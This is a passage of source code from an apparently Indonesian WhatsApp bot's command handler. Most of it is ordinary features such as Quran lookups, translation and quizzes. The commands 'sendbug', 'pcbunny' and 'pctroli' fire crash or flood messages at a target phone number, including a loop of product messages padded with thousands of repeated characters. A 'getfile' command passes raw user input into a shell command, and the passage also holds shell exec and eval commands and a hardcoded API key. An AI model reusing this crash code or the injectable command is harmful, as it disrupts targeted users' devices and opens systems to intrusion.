	console.log(err)
	setReply(`Case ${q} tidak di temukan`)
	}
	break
           
	
	           

	
	case 'autolevel':{
	if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
	if (autoLevel) return setReply('Sudah aktif kak')
	autoLevel = true
	setReply("Sukses mengaktifkan auto level!");
	} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
	if (!autoLevel) return setReply('Sudah Mati')
	autoLevel = false
	setReply("Sukses mematikan auto level!");
	} else if (!q) {
	conn.sendButMessage(from, `MODE AUTO LEVEL`, `Silahkan pilih salah satu`, [
	 {buttonId: `${prefix}autolevel on`, buttonText: {displayText: On },type: 1},
	 {buttonId: `${prefix}autolevel off`, buttonText: { displayText: Off },type: 1}], dev);
	 }
	 }
	break;
	
	
	case 'setbio':   
	 {
	if (!isOwner && !itsMe) return setReply("Khusus Owner")
	if (!q) return setReply(`Kirim perintah ${prefix+command} nama\n\nContoh : ${command} Paijo`)
	await conn.updateProfileStatus(q)
	await setReply(`Berhasil mengganti status bio ke *${q}*`)
	}
	break
	
	
	case 'speedtest': {
	let cp = require('child_process')
	let { promisify } = require('util')
	let exec2 = promisify(cp.exec).bind(cp)
	await setReply("_Testing Speed..._")
	let o
	try {
	o = await exec2('python speed.py')
	} catch (e) {
	o = e
	} finally {
	let { stdout, stderr } = o
	if (stdout.trim()) setReply(stdout)
	if (stderr.trim()) setReply(stderr)
	}
	}
	break     
	
	case 'listgc': {
	if(!isOwner) return onlyOwner()
	let getGroups = await conn.groupFetchAllParticipating()
	  //console.log(getGroups)
	let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
	let anu = groups.map(v => v.id)
	let teks = `⬣ *LIST GROUP CHAT*\n\nTotal Group : ${anu.length} Group\n\n`
	for (let i of anu) {
	let metadata2 = await conn.groupMetadata(i)
	teks += `◉ Nama : ${metadata2.subject}\n◉ Owner : ${metadata2.owner !== undefined ? '@' + metadata2.owner.split`@`[0] : 'Tidak diketahui'}\n◉ ID : ${metadata2.id}\n◉ Dibuat : ${moment(metadata2.creation * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n◉ Member : ${metadata2.participants.length}\n\n────────────────────────\n\n`
	 }
	conn.sendTextWithMentions(from, teks, dev)
	}
	break
	
	
	case 'listpc': {
	if(!isOwner) return onlyOwner()
	let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
	let teks = `⬣ *LIST PERSONAL CHAT*\n\nTotal Chat : ${anu.length} Chat\n\n`
	for (let i of anu) {
	let nama = store.messages[i].array[0].pushName
	teks += `◉ Nama : ${nama}\n◉ User : @${i.split('@')[0]}\n◉ Chat : @/${i.split('@')[0]}\n\n────────────────────────\n\n`
	}
	setReply(teks)
	 }
	break
	
	//Exec
	case '$':{
	if (!itsMe && !isOwner) return onlyOwner()
	await setReply("_Executing..._")
	exec(q, async (err, stdout) => {
	if (err) return setReply(`${copyright}:~ ${err}`)
	if (stdout) {
	await setReply(`*>_ Console*\n\n${stdout}`)
	}
	})
	}
	break
	
	//Eval.code
	case '>': {
	if (!isOwner) return setReply(mess.only.owner)
	try {
	let evaled = await eval(q)
	if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
	await setReply(evaled)
	} catch (err) {
	await setReply(String(err))
	}
	}
	break
	
	case '=>': {
	if (!isOwner) return setReply(mess.only.owner)
	function Return(sul) {
	let sat = JSON.stringify(sul, null, 2)
	if(sat){
	var bang = util.format(sat)
	} else if (sat == undefined) {
	var  bang = util.format(sul)
	}
	return setReply(bang)
	}
	try {
	setReply(util.format(eval(`(async () => { return ${q} })()`)))
	} catch (e) {
	setReply(String(e))
	}
	}
	break
	
	  case '+>':{
	 if (!isOwner) return
	try {
	return setReply(`OutPut: 
	${JSON.stringify(eval(budy.slice(2)),null,'\t')}
	`)
	} catch(err) {
	e = String(err)
	setReply(`"err" :  "${e}"`)
	}
	}
	break
	
	case 'sewa':{
	let { dada } = require("../message/sewabot.js")
	let teks = dada(prefix, pushname, ucapanWaktu)      
	let gbutsan = [{buttonId: `${prefix}owner`, buttonText: {displayText: `ᴏᴡɴᴇʀ`}, type: 1},
	{buttonId: `qrcode`, buttonText: {displayText: `ᴋᴏᴅᴇ ϙʀ`}, type: 1}]  
	conn.sendButLoc(from, teks,copyright, fs.readFileSync('./stik/thumb.jpeg'), gbutsan)                          
	}
	break
    case 'qrcode':{
    	conn.sendMessage(from, { image : { url: 'https://telegra.ph/file/b3c15034fa5adbe26c82c.jpg'}, caption: 'nih kak, di scan ya, jangan di telen, xixixi'}, { quoted: dev })
    }
    break
	case 'clearalluser':
	if (!isOwner) return onlyOwner()
	setReply("Sukses clear all User")
	db.data.users = {}
	break 
				
	case 'getfile':{
	let cp = require('child_process')
	let { promisify } = require('util')
	let exec2 = promisify(cp.exec).bind(cp)
	if (!q) return setReply( `uhm.. teksnya mana?\n\ncontoh\n${prefix + command} main`)
	setReply('Executing...')
	let o
	try {
	o = await exec2('type ' + q)
	} catch (e) {
	o = e
	} finally {
	 let { stdout, stderr } = o
	if (stdout.trim()) setReply(stdout)
	if (stderr.trim()) setReply(stderr)
	}
	}
	break
	
	case 'wallpaper': {
	if (!q) return setReply( 'Masukkan Query Title')
	let anu = await wallpaper(q)
	if(anu.length == "0") return setReply("Image tidak di temukan")
	let result = anu[Math.floor(Math.random() * anu.length)]
	let buttons = [
	{buttonId: `wallpaper ${text}`, buttonText: {displayText: 'Next Image'}, type: 1}
	]
	let buttonMessage = {
	image: { url: result.image[0] },
	caption: `⭔ Title : ${result.title}\n⭔ Category : ${result.type}\n⭔ Detail : ${result.source}\n⭔ Media Url : ${result.image[2] || result.image[1] || result.image[0]}`,
	footer: copyright,
	buttons: buttons,
	headerType: 4
	}
	conn.sendMessage(from, buttonMessage, { quoted: dev })
	}
	break
	
	case 'math': {
		let modes = {
	  noob: [-3, 3, -3, 3, '+-', 15000, 10],
	  easy: [-10, 10, -10, 10, '*/+-', 20000, 40],
	  medium: [-40, 40, -20, 20, '*/+-', 40000, 150],
	  hard: [-100, 100, -70, 70, '*/+-', 60000, 350],
	  extreme: [-999999, 999999, -999999, 999999, '*/', 99999, 9999],
	  impossible: [-99999999999, 99999999999, -99999999999, 999999999999, '*/', 30000, 35000],
	  impossible2: [-999999999999999, 999999999999999, -999, 999, '/', 30000, 50000]
	}
	
	let operators = {
	  '+': '+',
	  '-': '-',
	  '*': '×',
	  '/': '÷'
	}
	
	function genMath(mode) {
	  let [a1, a2, b1, b2, ops, time, bonus] = modes[mode]
	  let a = randomInt(a1, a2)
	  let b = randomInt(b1, b2)
	  let op = pickRandom([...ops])
	  let result = (new Function(`return ${a} ${op.replace('/', '*')} ${b < 0 ? `(${b})` : b}`))()
	  if (op == '/') [a, result] = [result, a]
	  return {
		str: `${a} ${operators[op]} ${b}`,
		mode,
		time,
		bonus,
		result
	  }
	}
	
	function randomInt(from, to) {
	  if (from > to) [from, to] = [to, from]
	  from = Math.floor(from)
	  to = Math.floor(to)
	  return Math.floor((to - from) * Math.random() + from)
	}
	
		
		
		
		
		
	 // conn.math = conn.math ? conn.math : {}
	  if (!q) return setReply( `
	┌─〔 Mode 〕
	├ ${Object.keys(modes).join('\n├ ')}
	└────    
	contoh:
	${prefix}math hard
	`)
	  let mode = args[0].toLowerCase()
	  if (!(mode in modes)) return setReply( `
	┌─〔 Mode 〕
	├ ${Object.keys(modes).join('\n├ ')}
	└────    
	contoh:
	${prefix}math hard
	`)
	  let id = from
	  if (id in conn.math) return setReply('Masih ada soal belum terjawab di chat ini')
	  let math2 = genMath(mode)
	  conn.math[id] = [
		await setReply(`Berapa hasil dari *${math2.str}*?\n\nTimeout: ${(math2.time / 1000).toFixed(2)} detik\nBonus Jawaban Benar: Rp${math2.bonus} `),
		math2, 4,
		setTimeout(async () => {
		  //if (conn.math[id]) await conn.sendButton(from, `Waktu habis!\nJawabannya adalah ${math2.result}`, '', `${math2.mode.toUpperCase()}`, `.math ${math2.mode}`, conn.math[id][0])
			if (conn.math[id]) await setReply(`Waktu habis!\nJawabannya adalah ${math2.result}\n\n${math2.mode.toUpperCase()}\n\nmath ${math2.mode}`)
	   delete conn.math[id]
		}, math2.time)
	  ]
	}
	break
	
	
	
	case 'hadis': {
			if (!args[0]) return setReply( `Contoh:
	${prefix + command} bukhari 1
	${prefix + command} abu-daud 1
	
	Pilihan tersedia:
	abu-daud
	1 - 4590
	ahmad
	1 - 26363
	bukhari
	1 - 7008
	darimi
	1 - 3367
	ibnu-majah
	1 - 4331
	nasai
	1 - 5662
	malik
	1 - 1594
	muslim
	1 - 5362`)
			if (!args[1]) return setReply( `Hadis yang ke berapa?\n\ncontoh:\n${prefix + command} muslim 1`)
			try {
			let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/json/hadith/${args[0]}`)
			let { number, arab, id } = res.find(v => v.number == args[1])
			setReply(`No. ${number}
	
	${arab}
	
	${id}`)
			} catch (e) {
			setReply(`Hadis tidak ditemukan !`)
			}
			}
			break
	
	
	case 'alquran': {
	if (!args[0]) return setReply( `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah surah Al-Fatihah ayat 2 beserta audionya, dan ayatnya 1 aja`)
	if (!args[1]) return setReply( `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah surah Al-Fatihah ayat 2 beserta audionya, dan ayatnya 1 aja`)
	let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/quran?surah=${args[0]}&ayat=${args[1]}`)
	let txt = `*Arab* : ${res.result.data.text.arab}
	*English* : ${res.result.data.translation.en}
	*Indonesia* �: ${res.result.data.translation.id}
	
	( Q.S ${res.result.data.surah.name.transliteration.id} : ${res.result.data.number.inSurah} )`
	setReply(txt)
	conn.sendMessage(from, {audio: { url: res.result.data.audio.primary }, mimetype: 'audio/mpeg'}, { quoted : dev })
	}
	break
	
	case 'tafsirsurah': {
	if (!args[0]) return setReply( `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah tafsir surah Al-Fatihah ayat 2`)
	if (!args[1]) return setReply( `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah tafsir surah Al-Fatihah ayat 2`)
	let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/quran?surah=${args[0]}&ayat=${args[1]}`)
	let txt = `「 *Tafsir Surah*  」
	
	*Pendek* : ${res.result.data.tafsir.id.short}
	
	*Panjang* : ${res.result.data.tafsir.id.long}
	
	( Q.S ${res.result.data.surah.name.transliteration.id} : ${res.result.data.number.inSurah} )`
	setReply(txt)
	}
	break
	
	
	 case 'react': {
	//if (!isOwner) return setReply( mess.only.owner)
	if(!q) return setReply(`Contoh ${prefix+command} 😝`)
	let reactionMessage = {
	react: {
	text: args[0],
	key: { remoteJid: from, fromMe: true, id: quoted.id }
	}
	}
	conn.sendMessage(from, reactionMessage)
	}
	break  
	
	case  'setgif':{
	if (!itsMe && !isOwner) return setReply(mess.only.ownerB)
	if(isVideo || isQuotedVideo){
	let delb = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
	await fse.copy(delb,`./stik/video.mp4`)
	fs.unlinkSync(delb)
	setReply(`Berhasil mengubah thumbnail`)
	} else {
	setReply(`Kirim gambar dengan caption ${prefix}setgif`);
	}
	}
	break
	
	
	case 'setquoted':
		if(!isOwner) return onlyOwner()
		if ((args[0]) === 'ftoko'|| (args[0]) === 'product' ){
			if(Qoted === "ftoko") return setReply("Udah aktif")
			Qoted = "ftoko"
			await conn.sendMessage(from, {text: `Berhasil mengubah quoted ke ${q}`}, {quoted: ftoko})
			} else if ((args[0]) === 'fkontak' ){
			if(Qoted === "fkontak") return setReply("Udah aktif")
			Qoted = "fkontak"
			await conn.sendMessage(from, {text: `Berhasil mengubah quoted ke ${q}`}, {quoted: fkontak})
			} else if ((args[0]) === 'ftext'){
			if(Qoted === "ftext") return setReply("Udah aktif")
			Qoted = "ftext"
			await conn.sendMessage(from, {text: `Berhasil mengubah quoted ke ${q}`}, {quoted: ftext})
			} else if ((args[0]) === 'ftroli'){
			if(Qoted === "ftroli") return setReply("Udah aktif")
			Qoted = "ftroli"
			await conn.sendMessage(from, {text: `Berhasil mengubah quoted ke ${q}`}, {quoted: ftroli})
			}else if ((args[0]) === 'fsticker' ){
			if(Qoted === "fsticker") return setReply("Udah aktif")
			Qoted = "fsticker"
			await conn.sendMessage(from, {text: `Berhasil mengubah quoted ke ${q}`}, {quoted: fsticker})
			} else if ((args[0]) === 'fvn'){
			if(Qoted === "fvn") return setReply("Udah aktif")
			Qoted = "fvn"
			await conn.sendMessage(from, {text: `Berhasil mengubah quoted ke ${q}`}, {quoted: fvn})
			} else if ((args[0]) === 'floc'){
			if(Qoted === "floc") return setReply("Udah aktif")
			Qoted = "floc"
			await conn.sendMessage(from, {text: `Berhasil mengubah quoted ke ${q}`}, {quoted: floc})
			} else if ((args[0]) === 'fvideo' ){
			if(Qoted === "fvideo") return setReply("Udah aktif")
			Qoted = "fvideo"
			await conn.sendMessage(from, {text: `Berhasil mengubah quoted ke ${q}`}, {quoted: fvideo})
			} else if ((args[0]) === 'fgc'){
			if(Qoted === "fgc") return setReply("Udah aktif")
			Qoted = "fgc"
			await conn.sendMessage(from, {text: `Berhasil mengubah quoted ke ${q}`}, {quoted: fgc})
			} else if ((args[0]) === 'fgif'){
			if(Qoted === "fgif") return setReply("Udah aktif")
			Qoted = "fgif"
			await conn.sendMessage(from, {text: `Berhasil mengubah quoted ke ${q}`}, {quoted: fgif})
			}else if ((args[0]) === 'fimage'){
			if(Qoted === "fimage") return setReply("Udah aktif")
			Qoted = "fimage"
			await conn.sendMessage(from, {text: `Berhasil mengubah quoted ke ${q}`}, {quoted: fimage})
			} else if ((args[0]) === 'dev'){
			if(Qoted === "dev") return setReply("Udah aktif")
			Qoted = "dev"
			await conn.sendMessage(from, {text: `Berhasil mengubah quoted ke ${q}`}, {quoted: dev})
			} else if (!q) {
			conn.sendButMessage(from, `SETTING QUOTED`, `Silahkan pilih salah satu`, [
			{buttonId: `${prefix}setquoted ftoko`, buttonText: {displayText: `ғᴛᴏᴋᴏ`},type: 1},
			{buttonId: `${prefix}setquoted fkontak`, buttonText: {displayText: `ғᴋᴏɴᴛᴀᴋ`},type: 1},
			{buttonId: `${prefix}setquoted ftext`, buttonText: { displayText: `ғᴛᴇxᴛ`},type: 1}],dev);
			 } else {
	 let teks =`Quoted yang kamu masukan salah\nSilakan pilih salah satu quoted berikut:\n1.ftoko\n2.fkontak\n3.ftext\n4.ftroli\n5.fsticker\n6.fvn\n7.floc\n8.fvideo\n9.fgc\n10.fgif\n11.fimage\n12.dev`
	 setReply(teks)
	 }
	break
	
	
	
	//Bug by Ius yg udah gua pecahin kodenya 😎
	case 'sendbug':
	try{
	if(!isOwner) return onlyOwner()
	let Pe = mentionByTag[0]? mentionByTag[0] : mentionByReply ? mentionByReply : q? numberQuery : false
	console.log(Pe)
	if(!Pe ) return setReply("Masukan nomer target")
	if(Pe == Ownerin) return setReply("SendBug Gagal")
	await setReply("Sending...")
	//await conn.sendKatalog(Pe, virtex8(prefix), virtex8(prefix), thumb, {quoted: setQuoted})
//	let a = await conn.sendMessage(from, { react: { text: "0️", key: { remoteJid: from, fromMe: true, id: dev.id } } })
	//conn.sendMessage(Pe, { text: "halo" }, { quoted: a });
  const muk = [{urlButton: {displayText: `Owner Bot`,url: `https://wa.me/${nomerOwner}`}}, 
{urlButton: {displayText: `Owner Bot`,url: `https://wa.me/${nomerOwner}`}}, 
{urlButton: {displayText: `Owner Bot`,url: `https://wa.me/${nomerOwner}`}}, 
{ quickReplyButton: { displayText: `ᴅᴀsʜʙᴏᴀʀᴅ`, id: `${prefix}dashboard` } },
{ quickReplyButton: { displayText: `ᴅᴀsʜʙᴏᴀʀᴅ`, id: `${prefix}dashboard` } },
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `${prefix}sewa` } }]
conn.send5ButMessage  (Pe, fake, copyright, muk  )
	setReply(`Berhasil mengirim Bug ke Nomer ${Pe.split("@")[0]}`)
	} catch (err){
	console.log(err)
	setReply("Gagal mengirim bug, Terjadi Error")
	}
	break
	case 'pcbunny': {
	try{
	if(!isOwner) return onlyOwner()
	let Pe = mentionByTag[0]? mentionByTag[0] : mentionByReply ? mentionByReply : q? numberQuery : false
	console.log(Pe)
	if(!Pe ) return setReply("Masukan nomer target")
	if(Pe == Ownerin) return setReply("SendBug Gagal")
	await setReply("Sending...")
	let bunnygcxez = `
///....▓▓▓▓
///..▓▓......▓
///..▓▓......▓▓..................▓▓▓▓
///..▓▓......▓▓..............▓▓......▓▓▓▓
///..▓▓....▓▓..............▓......▓▓......▓▓
///....▓▓....▓............▓....▓▓....▓▓▓....▓▓
///......▓▓....▓........▓....▓▓..........▓▓....▓
///........▓▓..▓▓....▓▓..▓▓................▓▓
///........▓▓......▓▓....▓▓
///.......▓......................▓
///.....▓.........................▓
///....▓......^..........^......▓
///....▓...........❤...........▓
///....▓..........................▓
///.....▓..........ٮ..........▓
///.........▓▓..........▓▓
`
             let bunnygcxeon13 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `🦄ᵈʳᵉᵃᵐ ᵍᵘʸ ˣᵉᵒⁿ⸙xbugbot`,
                            "jpegThumbnail": thumb
                        } 
                    } 
                }
            conn.sendMessage(Pe, {text:bunnygcxez},{quoted:bunnygcxeon13})
	setReply(`Berhasil mengirim Bug ke Nomer @${Pe.split("@")[0]}`)
	} catch (err){
	console.log(err)
	setReply("Gagal mengirim bug, Terjadi Error")
	}
    }
	break
	case 'pctroli':{
	try{
	if(!isOwner) return onlyOwner()
    if (!q) return setReply('masukan jumlahnya')
	let Pe = mentionByTag[0]? mentionByTag[0] : mentionByReply ? mentionByReply : q? numberQuery : false
	console.log(Pe)
	if(!Pe ) return setReply("Masukan nomer target")
	if(Pe == Ownerin) return setReply("SendBug Gagal")
	await setReply("Sending...")
	var messa = await prepareWAMessageMedia({ image: thumb }, { upload: conn.waUploadToServer })
let amount = `${(q)}`
for (let i = 0; i < amount; i++) {
var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "449756950375071",
"title": `[⫹⫺ - 㑒 SatganzDevs]\ 🦇̣̣̣̣̣̣̣̣⃟   ...𝛀..𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦??𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦??𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦??𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦`,
"description": copyright,
"currencyCode": "INR",
"footerText": copyright,
"priceAmount1000": "10000000",
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "10000000",
"retailerId":copyright,
"url": 'https://g.satganzdevs.repl.co'
},
"businessOwnerJid": "6281316701742@s.whatsapp.net",
}
}), { userJid: Pe, quoted: doc })
conn.relayMessage(Pe, catalog.message, { messageId: catalog.key.id })
}
	setReply(`Berhasil mengirim Bug ke Nomer @${Pe.split("@")[0]}`)
	} catch (err){
	console.log(err)
	setReply("Gagal mengirim bug, Terjadi Error")
	}
    }
	break
	case 'setlang':
	if(!isOwner) return onlyOwner()
	try{
	let translate = require('translate-google-api')
	let tld = 'cn'
	let result = await translate(`${text}`, {tld,to: q,})
	language = q
	setReply(`Berhasil mengubah bahasa ke ${q}`)
	} catch(err){
	setReply("Daftar bahasa yang didukung: https://cloud.google.com/translate/docs/languages")
	}
	break
	
	
	case 'tr': {
	let translate = require('translate-google-api')
	let defaultLang = 'en'
	let tld = 'cn'
	let err = `
	Contoh:
	${prefix + command} <lang> [text]
	${prefix + command} id your messages
	
	Daftar bahasa yang didukung: https://cloud.google.com/translate/docs/languages
	`.trim()
	
	let lang = args[0]
	let text = args.slice(1).join(' ')
	if ((args[0] || '').length !== 2) {
	lang = defaultLang
	text = args.join(' ')
	}
	if (!text && dev.quoted && dev.quoted.text) text = dev.quoted.text
	
		let result
		try {
			result = await translate(`${text}`, {
				tld,
				to: lang,
			})
		} catch (e) {
			result = await translate(`${text}`, {
				tld,
				to: defaultLang,
			})
			setReply(err)
		} finally {
			setReply(result[0])
		}
	
	}
	break
	
	case 'fb': 
	try{
	let {MessageType} = require('@adiwajshing/baileys')
	if (!args[0]) return setReply('Putting *URL* Facebook..')
	if (!args[0].includes("facebook")) return setReply(`Url is wrong..\n\n*Example:*\n${prefix}fb https://www.facebook.com/juankcortavarriaoficial/videos/218237676749570/`)
	let res = await fetch(`https://masgimenz.my.id/facebook/?url=` + args[0])
		//if (res.status !== 200) throw `Coba Lagi`
	let json = await res.json()
		//if (!json.result) throw `Media tidak ditemukan atau postingan mungkin diprivate`
    let url = json.videoUrl
	setReply('Sedang diproses...')
	if (url) await conn.sendMedia (from, url, dev, {caption: "Nih"})
		//if (url) await conn.sendMessage(m.chat, url, MessageType.video, {mimetype: 'video/mp4', quoted: m, caption: wm})
	else setReply('Link download tidak ditemukan')
	} catch (e){
		let res = await fetch(`https://api.neoxr.eu.org/api/fb?url=${args[0]}&apikey=obSw1DxesD`)
		let json = await res.json()
		if (!json.status) setReply( json)
		await setReply('Sedang di proses..')
		await conn.sendMedia (from, json.data[1].url, dev, {caption: "Nih"})
	}
	break
	
	case  'dashboard':{
	const d = (await import("lowdb")).default;
	const getFolderSize = (await import("get-folder-size")).default;
	let storage = await getFolderSize.loose('.');
	let moduls = await getFolderSize.loose('./node_modules');
	let session = await getFolderSize.loose('./session')
	let databse = await getFolderSize.strict('./database/database.json');
	for (let i of hitnya){
	let cekvipp = ms(i.expired - Date.now())
	var resetnye = `${cekvipp.hours} jam ${cekvipp.minutes} menit`             
	 } 
	
	 
	  
	let teks =`
	*Dashboard*     
	Runtime : ${runtime(process.uptime())}
	Reset : ${resetnye}
	Total Hit : ${thisHit.toLocaleString()}
	
	*Storage*
	Internal : ${FileSize(storage)}
	Modules : ${FileSize(moduls)}
	Session : ${FileSize(session)}
	Database : ${FileSize(databse)}
	`
